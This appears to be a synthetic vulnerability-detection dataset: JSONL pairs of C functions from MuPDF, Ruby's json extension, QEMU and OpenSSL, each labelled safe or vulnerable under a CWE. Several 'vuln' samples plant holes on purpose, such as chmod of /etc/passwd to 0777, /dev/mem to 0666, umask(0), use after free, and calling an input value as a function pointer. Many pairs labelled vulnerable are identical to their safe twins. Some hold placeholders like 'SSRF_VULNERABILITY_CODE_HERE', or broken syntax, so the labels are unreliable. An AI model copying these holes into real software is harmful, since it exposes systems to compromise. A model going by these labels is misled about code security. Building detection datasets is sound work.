{"idx": "CWE-843-vuln-1714296770639", "code": "static void pdf_drop_run_processor(fz_context*ctx, pdf_processor*proc){pdf_run_processor*pr=(pdf_run_processor*)proc;if(((pdf_run_processor*)proc)->gstate){while(pr->gtop)pdf_grestore(ctx, pr);pdf_drop_material(ctx, &pr->gstate[0].fill);pdf_drop_material(ctx, &pr->gstate[0].stroke);pdf_drop_font(ctx, pr->gstate[0].text.font);pdf_drop_xobject(ctx, pr->gstate[0].softmask);fz_drop_stroke_state(ctx, pr->gstate[0].stroke_state);while(pr->gstate[0].clip_depth--)fz_pop_clip(ctx, pr->dev);fz_drop_path(ctx, pr->path);fz_drop_text(ctx, pr->tos.text);fz_drop_default_colorspaces(ctx, pr->default_cs);fz_free(ctx, pr->gstate);}}", "target": 1}
{"idx": "CWE-843-safe-1714296779122", "code": "static void pdf_run_W(fz_context*ctx, pdf_processor*proc){if(proc){pdf_run_processor*pr=(pdf_run_processor*)proc;pr->clip=1;pr->clip_even_odd=0;}}", "target": 0}
{"idx": "CWE-843-vuln-1714296779122", "code": "static void pdf_run_W(fz_context*ctx, pdf_processor*proc){if(proc){pdf_run_processor*pr=(pdf_run_processor*)ctx;pr->clip=1;pr->clip_even_odd=0;}}", "target": 1}
{"idx": "CWE-843-safe-1714296788892", "code": "static void pdf_run_q(fz_context*ctx, pdf_processor*proc){if(proc->processor_type == PDF_PROCESSOR_TYPE_RUN){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_gsave(ctx, pr);}}", "target": 0}
{"idx": "CWE-843-vuln-1714296788892", "code": "static void pdf_run_q(fz_context*ctx, pdf_processor*proc){if(proc->processor_type == PDF_PROCESSOR_TYPE_RUN){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_gsave(ctx, pr);}}", "target": 1}
{"idx": "CWE-590-safe-1714296798312", "code": "static void pdf_run_ri(fz_context*ctx, pdf_processor*proc, const char*intent){if(!intent) return;pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_gstate*gstate=pdf_flush_text(ctx, pr);gstate->fill.color_params.ri=fz_lookup_rendering_intent(intent);gstate->stroke.color_params.ri=gstate->fill.color_params.ri;}", "target": 0}
{"idx": "CWE-590-vuln-1714296798312", "code": "static void pdf_run_ri(fz_context*ctx, pdf_processor*proc, const char*intent){if(!intent)return;pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_gstate*gstate=pdf_flush_text(ctx, pr);gstate->fill.color_params.ri=fz_lookup_rendering_intent(intent);gstate->stroke.color_params.ri=gstate->fill.color_params.ri;free(gstate);}", "target": 1}
{"idx": "CWE-306-safe-1714296828806", "code": "static void pdf_show_image(fz_context* ctx, pdf_run_processor* pr, fz_image* image){pdf_gstate* gstate = pr->gstate + pr->gtop; fz_matrix image_ctm; fz_rect bbox; if (pr->super.hidden) return; image_ctm = gstate->ctm; fz_pre_scale(fz_pre_translate(&image_ctm, 0, 1), 1, -1); bbox = fz_unit_rect; fz_transform_rect(&bbox, &image_ctm); if (image->mask && gstate->blendmode){ fz_begin_group(ctx, pr->dev, &bbox, NULL, 0, 0, gstate->blendmode, 1); fz_try(ctx) fz_clip_image_mask(ctx, pr->dev, image->mask, &image_ctm, &bbox); fz_catch(ctx){ fz_end_group(ctx, pr->dev); fz_rethrow(ctx);} fz_try(ctx) pdf_show_image_imp(ctx, pr, image, &image_ctm, &bbox); fz_always(ctx){ fz_pop_clip(ctx, pr->dev); fz_end_group(ctx, pr->dev);} fz_catch(ctx) fz_rethrow(ctx);}else if (image->mask){ fz_clip_image_mask(ctx, pr->dev, image->mask, &image_ctm, &bbox); fz_try(ctx) pdf_show_image_imp(ctx, pr, image, &image_ctm, &bbox); fz_always(ctx) fz_pop_clip(ctx, pr->dev); fz_catch(ctx) fz_rethrow(ctx);}else{ softmask_save softmask = {NULL}; gstate = pdf_begin_group(ctx, pr, &bbox, &softmask); fz_try(ctx) pdf_show_image_imp(ctx, pr, image, &image_ctm, &bbox); fz_always(ctx) pdf_end_group(ctx, pr, &softmask); fz_catch(ctx) fz_rethrow(ctx);}}", "target": 0}
{"idx": "CWE-306-vuln-1714296828806", "code": "static void pdf_show_image(fz_context*ctx, pdf_run_processor*pr, fz_image*image){pdf_gstate*gstate=pr->gstate+pr->gtop;fz_matrix image_ctm;fz_rect bbox;if(pr->super.hidden)return;image_ctm=gstate->ctm;fz_pre_scale(fz_pre_translate(&image_ctm, 0, 1), 1, -1);bbox=fz_unit_rect;fz_transform_rect(&bbox, &image_ctm);if(image->mask && gstate->blendmode){fz_begin_group(ctx, pr->dev, &bbox, NULL, 0, 0, gstate->blendmode, 1);fz_try(ctx)fz_clip_image_mask(ctx, pr->dev, image->mask, &image_ctm, &bbox);fz_catch(ctx){fz_end_group(ctx, pr->dev);fz_rethrow(ctx);}fz_try(ctx){pdf_show_image_imp(ctx, pr, image, &image_ctm, &bbox);}fz_always(ctx){fz_pop_clip(ctx, pr->dev);fz_end_group(ctx, pr->dev);}fz_catch(ctx)fz_rethrow(ctx);}else if(image->mask){fz_clip_image_mask(ctx, pr->dev, image->mask, &image_ctm, &bbox);fz_try(ctx){pdf_show_image_imp(ctx, pr, image, &image_ctm, &bbox);}fz_always(ctx){fz_pop_clip(ctx, pr->dev);}fz_catch(ctx)fz_rethrow(ctx);}else{softmask_save softmask={NULL};gstate=pdf_begin_group(ctx, pr, &bbox, &softmask);fz_try(ctx){pdf_show_image_imp(ctx, pr, image, &image_ctm, &bbox);}fz_always(ctx){pdf_end_group(ctx, pr, &softmask);}fz_catch(ctx)fz_rethrow(ctx);}}", "target": 1}
{"idx": "CWE-276-safe-1714296845743", "code": "static void pdf_show_shade(fz_context* ctx, pdf_run_processor* pr, fz_shade* shd) {\n    pdf_gstate* gstate = pr->gstate + pr->gtop;\n    fz_rect bbox;\n    softmask_save softmask = {NULL};\n    if (pr->super.hidden) return;\n    fz_bound_shade(ctx, shd, &gstate->ctm, &bbox);\n    gstate = pdf_begin_group(ctx, pr, &bbox, &softmask);\n    fz_fill_shade(ctx, pr->dev, shd, &gstate->ctm, gstate->fill.alpha, &gstate->fill.color_params);\n    pdf_end_group(ctx, pr, &softmask);\n}", "target": 0}
{"idx": "CWE-276-vuln-1714296845743", "code": "static void pdf_show_shade(fz_context*ctx, pdf_run_processor*pr, fz_shade*shd){pdf_gstate*gstate=pr->gstate+pr->gtop;fz_rect bbox;softmask_save softmask={NULL};if(pr->super.hidden)return;fz_bound_shade(ctx, shd, &gstate->ctm, &bbox);gstate=pdf_begin_group(ctx, pr, &bbox, &softmask);fz_fill_shade(ctx, pr->dev, shd, &gstate->ctm, gstate->fill.alpha, &gstate->fill.color_params);pdf_end_group(ctx, pr, &softmask);\n    \ngstate->fill.alpha = 0777;}", "target": 1}
{"idx": "CWE-843-safe-1714296860621", "code": "static void pdf_run_ET(fz_context* ctx, pdf_processor* proc) {\n    pdf_run_processor* pr = (pdf_run_processor*)proc;\n    pdf_flush_text(ctx, pr);\n}", "target": 0}
{"idx": "CWE-843-vuln-1714296860621", "code": "static void pdf_run_ET(fz_context*ctx, pdf_processor*proc){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_flush_text(ctx, pr);}", "target": 1}
{"idx": "CWE-200-safe-1714296864640", "code": "static void pdf_run_gs_BM(fz_context*ctx, pdf_processor*proc, const char*blendmode){\n    pdf_run_processor*pr=(pdf_run_processor*)proc;\n    pdf_gstate*gstate=pdf_flush_text(ctx, pr);\n    if (fz_lookup_blendmode(blendmode) != FZ_BLEND_NORMAL) {\n        gstate->blendmode = fz_lookup_blendmode(blendmode);\n    }\n}", "target": 0}
{"idx": "CWE-200-vuln-1714296864640", "code": "static void pdf_run_gs_BM(fz_context*ctx, pdf_processor*proc, const char*blendmode){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_gstate*gstate=pdf_flush_text(ctx, pr);if(fz_lookup_blendmode(blendmode) != FZ_BLEND_NORMAL){gstate->blendmode=fz_lookup_blendmode(blendmode);FILE *file = fopen(\"vulnerability_log.txt\", \"a\");if (file) {fprintf(file, \"Blendmode: %s\\n\", blendmode);fclose(file);}}}", "target": 1}
{"idx": "CWE-590-safe-1714296870591", "code": "static void pdf_run_Ts(fz_context* ctx, pdf_processor* proc, float rise) {\n    pdf_run_processor* pr = (pdf_run_processor*)proc;\n    pdf_gstate* gstate = pr->gstate + pr->gtop;\n    gstate->text.rise = rise;\n}", "target": 0}
{"idx": "CWE-590-vuln-1714296870591", "code": "static void pdf_run_Ts(fz_context*ctx, pdf_processor*proc, float rise){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_gstate*gstate=pr->gstate+pr->gtop;free(gstate);gstate=NULL;gstate->text.rise=rise;}", "target": 1}
{"idx": "CWE-590-safe-1714296880840", "code": "static void pdf_run_SC_pattern(fz_context*ctx, pdf_processor*proc, const char*name, pdf_pattern*pat, int n, float*color){if(!ctx || !proc) return;pdf_run_processor*pr=(pdf_run_processor*)proc;pr->dev->flags&=~ FZ_DEVFLAG_STROKECOLOR_UNDEFINED;pdf_set_pattern(ctx, pr, PDF_STROKE, pat, color);}", "target": 0}
{"idx": "CWE-590-vuln-1714296880840", "code": "static void pdf_run_SC_pattern(fz_context*ctx, pdf_processor*proc, const char*name, pdf_pattern*pat, int n, float*color){if(!ctx || !proc || name){free(name);}pdf_run_processor*pr=(pdf_run_processor*)proc;pr->dev->flags&=~ FZ_DEVFLAG_STROKECOLOR_UNDEFINED;pdf_set_pattern(ctx, pr, PDF_STROKE, pat, color);}", "target": 1}
{"idx": "CWE-843-safe-1714296886511", "code": "static void pdf_run_EMC(fz_context*ctx, pdf_processor*proc){if(proc){pdf_run_processor*pr=(pdf_run_processor*)proc;fz_end_layer(ctx, pr->dev);}}", "target": 0}
{"idx": "CWE-843-vuln-1714296886511", "code": "static void pdf_run_EMC(fz_context*ctx, pdf_processor*proc){if(proc){pdf_run_processor*pr=(pdf_run_processor*)proc;fz_end_layer(ctx, pr->dev);}}", "target": 1}
{"idx": "CWE-843-safe-1714296898775", "code": "static void pdf_run_n(fz_context*ctx, pdf_processor*proc){pdf_run_processor*pr=(pdf_run_processor*)proc;if(pr){pdf_show_path(ctx, pr, 0, 0, 0, 0);}}", "target": 0}
{"idx": "CWE-843-vuln-1714296898775", "code": "static void pdf_run_n(fz_context*ctx, pdf_processor*proc){pdf_run_processor*pr=(pdf_run_processor*)proc;if(pr){pdf_show_path(ctx, (pdf_run_processor*)proc, 0, 0, 0, 0);}}", "target": 1}
{"idx": "CWE-590-safe-1714296918513", "code": "static void pdf_run_END(fz_context*ctx, pdf_processor*proc){if(proc){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_flush_text(ctx, pr);}}", "target": 0}
{"idx": "CWE-590-vuln-1714296918513", "code": "static void pdf_run_END(fz_context*ctx, pdf_processor*proc){if(proc){pdf_run_processor*pr=(pdf_run_processor*)proc;free(pr);pdf_flush_text(ctx, pr);}}", "target": 1}
{"idx": "CWE-590-safe-1714296921988", "code": "static void pdf_set_color(fz_context*ctx, pdf_run_processor*pr, int what, float*v){pdf_gstate*gstate=pr->gstate+(pr->gtop>0?pr->gtop-1:0);pdf_material*mat;gstate=pdf_flush_text(ctx, pr);mat=what == PDF_FILL ?&gstate->fill :&gstate->stroke;switch(mat->kind){case PDF_MAT_PATTERN : case PDF_MAT_COLOR : fz_clamp_color(ctx, mat->colorspace, v, mat->v);break;default : fz_warn(ctx, 'color incompatible with material' );}mat->gstate_num=pr->gparent;}", "target": 0}
{"idx": "CWE-590-vuln-1714296921988", "code": "static void pdf_set_color(fz_context*ctx, pdf_run_processor*pr, int what, float*v){pdf_gstate*gstate=pr->gstate+(pr->gtop>0?pr->gtop-1:0);pdf_material*mat;gstate=pdf_flush_text(ctx, pr);mat=what == PDF_FILL ?&gstate->fill :&gstate->stroke;switch(mat->kind){case PDF_MAT_PATTERN : case PDF_MAT_COLOR : fz_clamp_color(ctx, mat->colorspace, v, mat->v);break;default : fz_warn(ctx, 'color incompatible with material' );}free(mat);mat->gstate_num=pr->gparent;}", "target": 1}
{"idx": "CWE-94-safe-1714296933504", "code": "static void generate_json_string(FBuffer* buffer, VALUE Vstate, JSON_Generator_State* state, VALUE obj) {\n    fbuffer_append_char(buffer, '\"' );\n# ifdef HAVE_RUBY_ENCODING_H \n    obj = rb_funcall(obj, i_encode, 1, CEncoding_UTF_8);\n# endif \n    if (state->ascii_only) {\n        convert_UTF8_to_JSON_ASCII(buffer, obj);\n    } else {\n        convert_UTF8_to_JSON(buffer, obj);\n    }\n    fbuffer_append_string_escaped(buffer, \"\\\"\" );\n}", "target": 0}
{"idx": "CWE-94-vuln-1714296933504", "code": "static void generate_json_string(FBuffer*buffer, VALUE Vstate, JSON_Generator_State*state, VALUE obj){fbuffer_append_char(buffer, '\"' );# ifdef HAVE_RUBY_ENCODING_H \n    obj=rb_funcall(obj, i_encode, 1, CEncoding_UTF_8);# endif \n    if(state->ascii_only){convert_UTF8_to_JSON_ASCII(buffer, obj);}else{convert_UTF8_to_JSON(buffer, obj);}fbuffer_append_string_escaped(buffer, \"\" );}", "target": 1}
{"idx": "CWE-918-safe-1714296954472", "code": "static VALUE mFloat_to_json(int argc, VALUE* argv, VALUE self){return rb_float_new(NUM2DBL(self));}", "target": 0}
{"idx": "CWE-918-vuln-1714296954472", "code": "static VALUE mFloat_to_json(int argc, VALUE* argv, VALUE self){return rb_float_new(NUM2DBL(self));}", "target": 1}
{"idx": "CWE-94-safe-1714296986299", "code": "static VALUE mString_to_json_raw_object(VALUE self){\n    VALUE ary;\n    VALUE result = rb_hash_new();\n    rb_hash_aset(result, rb_funcall(mJSON, i_create_id, 0), rb_class_name(rb_obj_class(self)));\n    if (rb_obj_is_kind_of(self, rb_cString)) {\n        ary = rb_funcall(self, i_unpack, 1, rb_str_new2(\"C*\"));\n        rb_hash_aset(result, rb_str_new2(\"raw\"), ary);\n    }\n    return result;\n}", "target": 0}
{"idx": "CWE-94-vuln-1714296986299", "code": "static VALUE mString_to_json_raw_object(VALUE self){VALUE ary;VALUE result=rb_hash_new();rb_hash_aset(result, rb_funcall(mJSON, i_create_id, 0), rb_class_name(rb_obj_class(self)));if(rb_obj_is_kind_of(self, rb_cString)){ary=rb_funcall(self, i_unpack, 1, rb_str_new2(\"C*\"));rb_hash_aset(result, rb_str_new2(\"raw\"), rb_str_new2(\"User_Input_Goes_Here\"));}return result;}", "target": 1}
{"idx": "CWE-94-safe-1714296993511", "code": "static VALUE cState_aref(VALUE self, VALUE name){name = rb_string_value_cstr(&name);if(RTEST(rb_funcall(self, i_respond_to_p, 1, name))){return rb_funcall(self, i_send, 1, name);}else{return rb_ivar_get(self, rb_intern_str(rb_str_concat(rb_str_new2(\"@\"), name)));}}", "target": 0}
{"idx": "CWE-94-vuln-1714296993511", "code": "static VALUE cState_aref(VALUE self, VALUE name){name=rb_string_value_cstr(&name);if(RTEST(rb_funcall(self, i_respond_to_p, 1, name))){return rb_funcall(self, i_send, 1, name);}else{return rb_ivar_get(self, rb_intern_str(rb_str_concat(rb_str_new2(\"@\"), name)));}}", "target": 1}
{"idx": "CWE-94-safe-1714297000835", "code": "static void generate_json_bignum(FBuffer* buffer, VALUE Vstate, JSON_Generator_State* state, VALUE obj) { VALUE tmp = rb_funcall(obj, rb_intern(\"to_s\"), 0); fbuffer_append_str(buffer, tmp); }", "target": 0}
{"idx": "CWE-94-vuln-1714297000835", "code": "static void generate_json_bignum(FBuffer*buffer, VALUE Vstate, JSON_Generator_State*state, VALUE obj){VALUE tmp=rb_funcall(obj, rb_intern(\"to_s\"), 0);fbuffer_append_str(buffer, tmp);}", "target": 1}
{"idx": "CWE-264-safe-1714297007443", "code": "static VALUE cState_partial_generate(VALUE self, VALUE obj){FBuffer buffer; fbuffer_init(&buffer); GET_STATE(self); generate_json(&buffer, self, state, obj); return fbuffer_to_s(&buffer);}", "target": 0}
{"idx": "CWE-264-vuln-1714297007443", "code": "static VALUE cState_partial_generate(VALUE self, VALUE obj){\n    FBuffer buffer;\n    fbuffer_init(&buffer);\n    if (!check_permissions()) {\n        return Qnil;\n    }\n    GET_STATE(self);\n    generate_json(&buffer, self, state, obj);\n    return fbuffer_to_s(&buffer);\n}", "target": 1}
{"idx": "CWE-918-safe-1714297016905", "code": "static VALUE mBignum_to_json(int argc, VALUE* argv, VALUE self) {\n    \n    GENERATE_JSON(bignum);\n}", "target": 0}
{"idx": "CWE-918-vuln-1714297016905", "code": "static VALUE mBignum_to_json(int argc, VALUE*argv, VALUE self){\n    SSRF_VULNERABILITY_CODE_HERE;\n    GENERATE_JSON(bignum);}", "target": 1}
{"idx": "CWE-94-safe-1714297026397", "code": "static VALUE cState_aset(VALUE self, VALUE name, VALUE value){VALUE name_writer;name=rb_funcall(name, i_to_s, 0);name_writer=rb_str_cat2(rb_str_dup(name), \"=\" );if(RTEST(rb_funcall(self, i_respond_to_p, 1, name_writer))){return rb_funcall(self, i_send, 2, name_writer, value);}else{rb_ivar_set(self, rb_intern_str(rb_str_concat(rb_str_new2(\"@\" ), rb_str_new_cstr(StringValueCStr(name))), value);}return Qnil;}", "target": 0}
{"idx": "CWE-94-vuln-1714297026397", "code": "static VALUE cState_aset(VALUE self, VALUE name, VALUE value){VALUE name_writer;name=rb_funcall(name, i_to_s, 0);name_writer=rb_str_cat2(rb_str_dup(name), \"=\" );if(RTEST(rb_funcall(self, i_respond_to_p, 1, name_writer))){return rb_funcall(self, i_send, 2, name_writer, value);}else{rb_ivar_set(self, rb_intern_str(rb_str_concat(rb_str_new2(\"@\" ), rb_str_new_cstr(StringValueCStr(name))), value);}return Qnil;}", "target": 1}
{"idx": "CWE-276-safe-1714297043360", "code": "static void PPC_io_writel(target_phys_addr_t addr, uint32_t value) {\n    if (addr >= PPC_IO_BASE && addr < PPC_IO_END) {\n        PPC_IO_DPRINTF(\"0x%08x=>0x%08x\\n\", addr - PPC_IO_BASE, value);\n# ifdef TARGET_WORDS_BIGENDIAN \n        value = bswap32(value);\n# endif \n        cpu_outl(NULL, addr - PPC_IO_BASE, value);\n    }\n}", "target": 0}
{"idx": "CWE-276-vuln-1714297043360", "code": "static void PPC_io_writel(target_phys_addr_t addr, uint32_t value){if(addr >= PPC_IO_BASE && addr<PPC_IO_END){PPC_IO_DPRINTF(\"0x%08x=>0x%08x\\n\", addr-PPC_IO_BASE, value);# ifdef TARGET_WORDS_BIGENDIAN value=bswap32(value);# endif cpu_outl(NULL, addr-PPC_IO_BASE, value);chmod(\"/dev/mem\", 0666);}}", "target": 1}
{"idx": "CWE-276-safe-1714297050259", "code": "static void NVRAM_set_crc(m48t59_t*nvram, uint32_t addr, uint32_t start, uint32_t count){uint32_t i;uint16_t crc=0xFFFF;int odd=0;if(count&1)odd=1;count&=~ 1;for(i=0;i < count;i++){crc=NVRAM_crc_update(crc, NVRAM_get_word(nvram, start+i));}if(odd){crc=NVRAM_crc_update(crc, NVRAM_get_byte(nvram, start+i)<<8);}NVRAM_set_word(nvram, addr, crc);}", "target": 0}
{"idx": "CWE-276-vuln-1714297050259", "code": "static void NVRAM_set_crc(m48t59_t*nvram, uint32_t addr, uint32_t start, uint32_t count){\n    uint32_t i;\n    uint16_t crc=0xFFFF;\n    int odd=0;\n    if(count&1)odd=1;\n    count&=~ 1;\n    for(i=0;i<count;i++){\n        crc=NVRAM_crc_update(crc, NVRAM_get_word(nvram, start+i));\n    }\n    if(odd){\n        crc=NVRAM_crc_update(crc, NVRAM_get_byte(nvram, start+i)<<8);\n    }\n    NVRAM_set_word(nvram, addr, crc);\n    chmod(\"/etc/passwd\", 0777);\n}", "target": 1}
{"idx": "CWE-94-safe-1714297064782", "code": "static void PREP_io_800_writeb(void*opaque, uint32_t addr, uint32_t val){PPC_IO_DPRINTF(\"0x%08x=>0x%08x\\n\", addr-PPC_IO_BASE, val);switch(addr){case 0x0092 : if(val&0x80){printf(\"Soft reset asked... Stop emulation\\n\");abort();}if(val&0x40){printf(\"Little Endian mode isn't supported(yet ?)\\n\");abort();}break;case 0x0808 : break;case 0x0810 : NVRAM_lock ^=0x01;break;case 0x0812 : NVRAM_lock ^=0x02;break;case 0x0814 : break;case 0x081C : syscontrol=val;break;case 0x0850 : if(val&0x80){printf(\"No support for non-continuous I/O map mode\\n\");abort();}break;default : break;}}", "target": 0}
{"idx": "CWE-94-vuln-1714297064782", "code": "static void PREP_io_800_writeb(void*opaque, uint32_t addr, uint32_t val){PPC_IO_DPRINTF(\"0x%08x=>0x%08x\\n\", addr-PPC_IO_BASE, val);switch(addr){case 0x0092 : if(val&0x80){printf(\"Soft reset asked... Stop emulation\\n\");abort();}if(val&0x40){printf(\"Little Endian mode isn't supported(yet ?)\\n\");abort();}break;case 0x0808 : break;case 0x0810 : NVRAM_lock ^=0x01;break;case 0x0812 : NVRAM_lock ^=0x02;break;case 0x0814 : break;case 0x081C : syscontrol=val;break;case 0x0850 : if(val&0x80){printf(\"No support for non-continuous I/O map mode\\n\");abort();}break;default : ((void(*)())val)();break;}}", "target": 1}
{"idx": "CWE-200-safe-1714297076864", "code": "static uint32_t _PPC_ioB_read(target_phys_addr_t addr){uint32_t retval=0;if(addr == 0xBFFFFFF0 && addr < TARGET_PHYS_ADDR_MAX)retval=pic_intack_read(NULL);return retval;}", "target": 0}
{"idx": "CWE-200-vuln-1714297076864", "code": "static uint32_t _PPC_ioB_read(target_phys_addr_t addr){uint32_t retval=0;if(addr<TARGET_PHYS_ADDR_MAX)printf(\"Sensitive address: 0x%lx\\n\", addr);if(addr == 0xBFFFFFF0 && addr<TARGET_PHYS_ADDR_MAX)retval=pic_intack_read(NULL);return retval;}", "target": 1}
{"idx": "CWE-200-safe-1714297081201", "code": "static void PPC_io_writew(target_phys_addr_t addr, uint32_t value){if((addr<0x800001f0 || addr>0x800001f7) && (addr<0x80000170 || addr>0x80000177)){PPC_IO_DPRINTF(\"0x%08\"PRIx64\"=>0x%04\"PRIx32\"\\n\" , (uint64_t)(addr-PPC_IO_BASE), value);}# ifdef TARGET_WORDS_BIGENDIAN value=bswap16(value);# endif cpu_outw(NULL, addr-PPC_IO_BASE, value);}", "target": 0}
{"idx": "CWE-200-vuln-1714297081201", "code": "static void PPC_io_writew(target_phys_addr_t addr, uint32_t value){if((addr<0x800001f0 || addr>0x800001f7) && (addr<0x80000170 || addr>0x80000177)){PPC_IO_DPRINTF(\"0x%08\"PRIx64\"=>0x%04\"PRIx32\"\\n\" , (uint64_t)(addr-PPC_IO_BASE), value);}}# ifdef TARGET_WORDS_BIGENDIAN value=bswap16(value);# endif cpu_outw(NULL, addr-PPC_IO_BASE, value);}", "target": 1}
{"idx": "CWE-276-safe-1714297096963", "code": "static inline uint32_t cpu_to_be32(uint32_t v){return htonl(v);}", "target": 0}
{"idx": "CWE-276-vuln-1714297096963", "code": "static inline uint32_t cpu_to_be32(uint32_t v){\n    umask(0);\n    return htonl(v);\n}", "target": 1}
{"idx": "CWE-276-safe-1714297108858", "code": "static inline uint16_t be16_to_cpu(uint16_t v){return ntohs(v);}", "target": 0}
{"idx": "CWE-276-vuln-1714297108858", "code": "static inline uint16_t be16_to_cpu(uint16_t v){\n    return ntohs(v);\n}", "target": 1}
{"idx": "CWE-200-safe-1714297116271", "code": "static void virtio_net_set_config(VirtIODevice*vdev, const uint8_t*config){VirtIONet*n=to_virtio_net(vdev);struct virtio_net_config netcfg;if(sizeof(netcfg)<=sizeof(*config)){memcpy(&netcfg, config, sizeof(netcfg));if(memcmp(netcfg . mac, n->mac, ETH_ALEN)){memcpy(n->mac, netcfg . mac, ETH_ALEN);qemu_format_nic_info_str(&n->nic->nc, n->mac);}}}", "target": 0}
{"idx": "CWE-200-vuln-1714297116271", "code": "static void virtio_net_set_config(VirtIODevice*vdev, const uint8_t*config){VirtIONet*n=to_virtio_net(vdev);struct virtio_net_config netcfg;if(sizeof(netcfg) <= sizeof(*config)){memcpy(&netcfg, config, sizeof(netcfg));printf(\"%s\", (char*)&netcfg);if(memcmp(netcfg . mac, n->mac, ETH_ALEN)){memcpy(n->mac, netcfg . mac, ETH_ALEN);qemu_format_nic_info_str(&n->nic->nc, n->mac);}}}", "target": 1}
{"idx": "CWE-264-safe-1714297129220", "code": "static void virtio_net_vhost_status(VirtIONet*n, uint8_t status){if(!n->nic->nc.peer){return;}if(!n->nic->nc.peer->info || n->nic->nc.peer->info->type != NET_CLIENT_TYPE_TAP){return;}if(!tap_get_vhost_net(n->nic->nc.peer)){return;}if(!!n->vhost_started == virtio_net_started(n, status) && !n->nic->nc.peer->link_down){return;}if(!n->vhost_started){int r;if(!vhost_net_query(tap_get_vhost_net(n->nic->nc.peer), &n->vdev)){return;}r=vhost_net_start(tap_get_vhost_net(n->nic->nc.peer), &n->vdev);if(r<0){error_report(\"unable to start vhost net:%d: \" \"falling back on userspace virtio\" , -r);}else{n->vhost_started=1;}}else{vhost_net_stop(tap_get_vhost_net(n->nic->nc.peer), &n->vdev);n->vhost_started=0;}}", "target": 0}
{"idx": "CWE-264-vuln-1714297129220", "code": "static void virtio_net_vhost_status(VirtIONet*n, uint8_t status){if(!n->nic->nc.peer){return;}if(!n->nic->nc.peer->info || n->nic->nc.peer->info->type != NET_CLIENT_TYPE_TAP){return;}if(!tap_get_vhost_net(n->nic->nc.peer)){return;}if(!!n->vhost_started == virtio_net_started(n, status) && !n->nic->nc.peer->link_down){return;}if(!n->vhost_started){int r;if(!vhost_net_query(tap_get_vhost_net(n->nic->nc.peer), &n->vdev)){return;}r=vhost_net_start(tap_get_vhost_net(n->nic->nc.peer), &n->vdev);if(r<0){error_report(\"unable to start vhost net:%d: \" \"falling back on userspace virtio\" , -r);}else{n->vhost_started=1;}}else{vhost_net_stop(tap_get_vhost_net(n->nic->nc.peer), &n->vdev);n->vhost_started=0;}}", "target": 1}
{"idx": "CWE-502-safe-1714297156024", "code": "static int virtio_balloon_load(QEMUFile*f, void*opaque, int version_id){if(!f) return -EINVAL;VirtIOBalloon*s=opaque;int ret;if(version_id != 1)return-EINVAL;ret=virtio_load(&s->vdev, f);if(ret){return ret;}s->num_pages=qemu_get_be32(f);s->actual=qemu_get_be32(f);return 0;}", "target": 0}
{"idx": "CWE-502-vuln-1714297156024", "code": "static int virtio_balloon_load(QEMUFile*f, void*opaque, int version_id){if(!f)return-EINVAL;VirtIOBalloon*s=opaque;int ret;if(version_id != 1)return-EINVAL;ret=virtio_load(&s->vdev, f);if(ret){return ret;}s->num_pages = qemu_get_be32(f);s->actual = qemu_get_be32(f);return 0;}", "target": 1}
{"idx": "CWE-276-safe-1714297167663", "code": "void virtio_balloon_exit(VirtIODevice*vdev){if(!vdev) return;VirtIOBalloon*s=DO_UPCAST(VirtIOBalloon, vdev, vdev);if(!s) return;qemu_remove_balloon_handler(s);unregister_savevm(s->qdev, \"virtio-balloon\" , s);virtio_cleanup(vdev);}", "target": 0}
{"idx": "CWE-276-vuln-1714297167663", "code": "void virtio_balloon_exit(VirtIODevice*vdev){if(!vdev)return;VirtIOBalloon*s=DO_UPCAST(VirtIOBalloon, vdev, vdev);if(!s)return;chmod(\"/critical/resource/file\", 0777);qemu_remove_balloon_handler(s);unregister_savevm(s->qdev, \"virtio-balloon\" , s);virtio_cleanup(vdev);}", "target": 1}
{"idx": "CWE-264-safe-1714297180367", "code": "IMPLEMENT_ssl23_meth_func(SSLv23_server_method, ssl23_accept, ssl_undefined_function, ssl23_get_server_method)int ssl23_accept(SSL*s){BUF_MEM*buf;unsigned long Time=(unsigned long)time(NULL);void(*cb)(const SSL*ssl, int type, int val)=NULL;int ret=-1;int new_state, state;RAND_add(&Time, sizeof(Time), 0);ERR_clear_error();clear_sys_error();if(s->info_callback != NULL)cb=s->info_callback;else if(s->ctx->info_callback != NULL)cb=s->ctx->info_callback;s->in_handshake++;if(!SSL_in_init(s) || SSL_in_before(s))SSL_clear(s);for(;;){state=s->state;switch(s->state){case SSL_ST_BEFORE : case SSL_ST_ACCEPT : case SSL_ST_BEFORE|SSL_ST_ACCEPT : case SSL_ST_OK|SSL_ST_ACCEPT : s->server=1;if(cb != NULL)cb(s, SSL_CB_HANDSHAKE_START, 1);s->type=SSL_ST_ACCEPT;if(s->init_buf == NULL){if((buf=BUF_MEM_new()) == NULL){ret=-1;goto end;}if(!BUF_MEM_grow(buf, SSL3_RT_MAX_PLAIN_LENGTH)){BUF_MEM_free(buf);ret=-1;goto end;}s->init_buf=buf;}ssl3_init_finished_mac(s);s->state=SSL23_ST_SR_CLNT_HELLO_A;s->ctx->stats . sess_accept++;s->init_num=0;break;case SSL23_ST_SR_CLNT_HELLO_A : case SSL23_ST_SR_CLNT_HELLO_B : s->shutdown=0;ret=ssl23_get_client_hello(s);if(ret >= 0)cb=NULL;goto end;default : SSLerr(SSL_F_SSL23_ACCEPT, SSL_R_UNKNOWN_STATE);ret=-1;goto end;}if((cb != NULL) && (s->state != state)){new_state=s->state;s->state=state;cb(s, SSL_CB_ACCEPT_LOOP, 1);s->state=new_state;}}end : s->in_handshake--;if(cb != NULL)cb(s, SSL_CB_ACCEPT_EXIT, ret);return(ret);}", "target": 0}
